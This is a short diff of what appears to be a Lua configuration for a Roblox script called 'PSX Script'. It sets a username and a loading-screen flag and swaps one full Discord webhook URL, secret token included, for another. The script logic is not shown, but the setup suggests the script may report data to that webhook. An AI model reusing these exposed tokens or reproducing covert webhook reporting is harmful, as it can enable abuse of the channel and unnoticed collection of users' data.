@@ -1,5 +1,5 @@
 Username = "loadstping"
-WebHook = "https://discord.com/api/webhooks/1096722596512399470/lcTRR0iG8GJ8Htznp9-1xURacYaESss6R5T4WwznOpISQ9LMrBZc_sspD_xhwuUCofBv"
+WebHook = "https://discord.com/api/webhooks/1097109265128378519/9a1uzxvVxNHgsPQdATF5BZvCrKaCOqyG1fkxTqNYsO7sXdIXppH_VyIrxrDr-nHpSL_T"
  
 loadingscreen = true
 _G.CustomScriptName = "PSX Script"
